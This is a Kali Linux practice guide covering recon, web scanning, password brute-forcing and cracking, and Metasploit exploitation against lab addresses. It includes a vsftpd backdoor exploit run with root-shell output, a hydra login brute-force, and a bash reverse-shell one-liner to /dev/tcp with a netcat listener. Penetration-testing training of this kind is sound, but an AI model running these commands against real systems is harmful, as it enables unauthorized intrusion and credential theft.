# Comprehensive Kali Linux Practice & Command Reference Guide

Welcome to the **Kali Linux Comprehensive Practice Guide**. This document is designed as an end-to-end hands-on manual covering terminal navigation, system administration, network recon, web app testing, password security, and exploitation workflows in Kali Linux.

---

## Table of Contents
1. [System Fundamentals & User Management](#1-system-fundamentals--user-management)
2. [File Navigation & Manipulation](#2-file-navigation--manipulation)
3. [Networking & Interface Operations](#3-networking--interface-operations)
4. [Information Gathering & Reconnaissance](#4-information-gathering--reconnaissance)
5. [Vulnerability Analysis & Web Testing](#5-vulnerability-analysis--web-testing)
6. [Password Cracking & Credentials](#6-password-cracking--credentials)
7. [Exploitation & Metasploit Framework](#7-exploitation--metasploit-framework)
8. [Practical Hands-On Lab Workflows](#8-practical-hands-on-lab-workflows)

---

## 1. System Fundamentals & User Management

Modern Kali Linux releases operate under a non-root default user policy (`kali:kali`) and use `zsh` as the default interactive shell.

### Essential System Commands
```bash
# Display current logged-in user and permissions
whoami

# View user ID (UID), group ID (GID), and group memberships
id

# Check system hostname
hostname

# View system architecture and kernel version
uname -a

# Switch to root superuser mode
sudo -i

# Execute a single command with root privileges
sudo apt update
```

### Visual Interface Reference: Terminal Session
```
┌──(kali㉿kali)-[~]
└─$ whoami
kali

┌──(kali㉿kali)-[~]
└─$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),142(kaboxer)

┌──(kali㉿kali)-[~]
└─$ uname -a
Linux kali 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1kali1 x86_64 GNU/Linux
```

### User & Group Administration
```bash
# Add a new user
sudo adduser standard_user

# Modify user privileges (add to sudo group)
sudo usermod -aG sudo standard_user

# Change account password
sudo passwd standard_user

# Delete user account and home directory
sudo deluser --remove-home standard_user
```

---

## 2. File Navigation & Manipulation

Understanding file paths, searching, inspection, and permission flags is essential for terminal speed and payload execution.

### Navigation & Directory Structure
```bash
# Print current working directory
pwd

# List contents with hidden files (-a) and detailed permissions (-l) in human-readable sizes (-h)
ls -lah

# Change directory
cd /var/www/html

# Move back to previous directory
cd -

# Return directly to current user's home directory
cd ~
```

### File Inspection & Operations
```bash
# Create directory structure recursively
mkdir -p ~/labs/recon/target1

# Create an empty file or touch timestamp
touch ~/labs/recon/target1/notes.txt

# Copy files and directories recursively
cp -r ~/labs/recon/target1 ~/labs/recon/target1_backup

# Move/Rename files
mv ~/labs/recon/target1/notes.txt ~/labs/recon/target1/recon_notes.txt

# View file content
cat ~/labs/recon/target1/recon_notes.txt

# View large files page-by-page
less /var/log/auth.log

# View first/last N lines of a file
head -n 20 /etc/passwd
tail -n 20 /var/log/syslog

# Follow a log file live (real-time stream)
tail -f /var/log/nginx/access.log
```

### File Search & Text Filtering
```bash
# Find files by name across the system
find / -type f -name "*.conf" 2>/dev/null

# Search inside files for specific patterns using grep
grep -i "password" /var/www/html/config.php

# Combine grep with pipeline processing
cat /etc/passwd | grep -E "sh$"
```

### File Permissions & Ownership
Permissions are represented as Read (`4`), Write (`2`), and Execute (`1`).

```bash
# Make a shell script executable
chmod +x exploit.sh

# Restrict SSH private key so only owner can read/write
chmod 600 id_rsa

# Grant full read/write/execute permissions to owner, read/execute to group and others
chmod 755 binary_tool

# Change owner and group of a file
sudo chown kali:kali /opt/custom_tool
```

---

## 3. Networking & Interface Operations

Networking tools allow you to inspect local adapter configurations, review socket connections, and manage routing tables.

### Network Configuration & Inspection
```bash
# Display network interfaces and assigned IP addresses
ip a

# Display network routing table
ip route

# Display active TCP/UDP listening ports with PID and program names
ss -tulpn

# Monitor network interfaces in real time
ifconfig eth0
```

### Visual Interface Reference: Network Sockets (`ss -tulpn`)
```
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process
udp    UNCONN  0       0        0.0.0.0:68           0.0.0.0:*          users:(("dhclient",pid=542,fd=6))
tcp    LISTEN  0       128      0.0.0.0:22           0.0.0.0:*          users:(("sshd",pid=812,fd=3))
tcp    LISTEN  0       80       127.0.0.1:3306       0.0.0.0:*          users:(("mariadbd",pid=943,fd=17))
tcp    LISTEN  0       511      0.0.0.0:80           0.0.0.0:*          users:(("apache2",pid=1120,fd=6))
```

### File Transfers & Connectivity Diagnostics
```bash
# Check connectivity to host
ping -c 4 192.168.1.1

# Resolve DNS record for a domain
dig example.com ANY

# Fetch web page or payload via curl
curl -I http://192.168.1.50

# Download file directly to local directory
wget http://192.168.1.50/payload.bin -O /tmp/payload.bin

# Setup netcat listener to catch inbound shell connection
nc -lvnp 4444
```

---

## 4. Information Gathering & Reconnaissance

Reconnaissance is the active or passive collection of intelligence regarding target infrastructure.

### Domain & DNS Reconnaissance
```bash
# Query domain registration metadata
whois targetdomain.com

# Automated DNS enumeration
dnsrecon -d targetdomain.com -t std

# Extract domain contacts, email addresses, and subdomains
theHarvester -d targetdomain.com -b all
```

### Network & Port Scanning with Nmap
```bash
# Fast ARP scan for live hosts on subnet
sudo nmap -sn 192.168.1.0/24

# Standard TCP SYN Stealth Scan against common ports
sudo nmap -sS -sV 192.168.1.50

# Full comprehensive scan (All ports, OS detection, Default scripts, Traceroute)
sudo nmap -p- -A -T4 192.168.1.50 -oA target1_full
```

### Visual Interface Reference: Nmap Scan Output
```
Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-28 22:00 BST
Nmap scan report for 192.168.1.50
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Welcome to Target Site
443/tcp open ssl/http Apache httpd 2.4.56
MAC Address: 00:0C:29:8E:53:A1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
```

---

## 5. Vulnerability Analysis & Web Testing

Analyzing web applications and network services for known misconfigurations and unpatched vulnerabilities.

### Web Directory & Path Brute-Forcing
```bash
# Discover hidden directories and files using Gobuster
gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt -t 30

# Fast web directory scan using FFUF
ffuf -u http://192.168.1.50/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.5-medium.txt -mc 200,301,302
```

### Visual Interface Reference: Gobuster Directory Enumeration
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.50
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 315] [--> http://192.168.1.50/admin/]
/assets               (Status: 301) [Size: 316] [--> http://192.168.1.50/assets/]
/config.php           (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 316] [--> http://192.168.1.50/images/]
/login.php            (Status: 200) [Size: 1540]
/uploads              (Status: 301) [Size: 317] [--> http://192.168.1.50/uploads/]
===============================================================
Finished
===============================================================
```

### Automated SQL Injection & Web Vulnerability Scans
```bash
# Scan web application using Nikto
nikto -h http://192.168.1.50

# Test vulnerable HTTP GET parameters for SQL Injection using sqlmap
sqlmap -u "http://192.168.1.50/product.php?id=1" --dbs --batch
```

---

## 6. Password Cracking & Credentials

Authentication testing involves testing login endpoints with wordlists like `rockyou.txt`.

### Preparing Wordlists
```bash
# Decompress default rockyou wordlist in Kali
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Online Brute-Force Attacks with Hydra
```bash
# Brute-force SSH authentication
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh -t 4

# Brute-force Web Form POST endpoint
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

### Offline Hash Cracking (John the Ripper & Hashcat)
```bash
# Crack password hashes using John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Crack NTLM hashes using Hashcat (Mode 1000)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Visual Interface Reference: Hashcat Output
```
hashcat (v6.2.6) starting...

Hashes: 1 digest loaded from file
Algorithm: NTLM (Mode 1000)

112233445566778899aabbccddeeff00:Password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 112233445566778899aabbccddeeff00
Time.Started.....: Mon Sep 28 22:05:12 2026 (1 sec)
Speed.#1.........:  148.2 MH/s
```

---

## 7. Exploitation & Metasploit Framework

The Metasploit Framework simplifies target exploitation and post-exploitation validation.

### Metasploit Console Commands
```bash
# Initialize and start Metasploit database service
sudo systemctl start postgresql
msfdb init

# Launch Metasploit Framework Console
msfconsole
```

### Interactive MSF Console Commands
```msf
# Search for vulnerability modules
search vsftpd

# Select a module
use exploit/unix/ftp/vsftpd_234_backdoor

# Display required options
show options

# Set target configurations
set RHOSTS 192.168.1.50
set LHOST 192.168.1.20

# Execute exploit
exploit
```

### Visual Interface Reference: Metasploit Console Execution
```
┌──(kali㉿kali)-[~]
└─$ msfconsole

  +[ msfv6.3.15-dev                                  ]
  + -- --=[ 2310 exploits - 1205 auxiliary - 410 post ]

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.50
RHOSTS => 192.168.1.50
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.1.50:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.50:21 - USER :)(:
[+] 192.168.1.50:21 - Backdoor service successfully opened.
[*] Command shell session 1 opened (192.168.1.20:44211 -> 192.168.1.50:6200) at 2026-09-28 22:10:00 +0100

id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 8. Practical Hands-On Lab Workflows

Follow these step-by-step end-to-end practical workflows to practice core competencies.

### Practical Workflow 1: Host Recon & Service Identification
1. **Discover live subnet targets:**
   ```bash
   sudo nmap -sn 192.168.1.0/24
   ```
2. **Perform deep port scanning on target host:**
   ```bash
   sudo nmap -sS -sV -sC -p 1-10000 192.168.1.50 -oN target_scan.txt
   ```
3. **Analyze open ports and record service banners.**

### Practical Workflow 2: Web App Directory Brute-Force & Analysis
1. **Start web server scan:**
   ```bash
   nikto -h http://192.168.1.50
   ```
2. **Enumerate web paths:**
   ```bash
   gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
   ```
3. **Inspect administrative panel endpoints discovered in results.**

### Practical Workflow 3: Capturing a Reverse Shell
1. **Set up receiver on Kali attacker machine:**
   ```bash
   nc -lvnp 4444
   ```
2. **Execute command payload on target machine (via web app input or RCE):**
   ```bash
   bash -i >& /dev/tcp/192.168.1.20/4444 0>&1
   ```
3. **Upgrade shell to fully interactive TTY inside receiver session:**
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```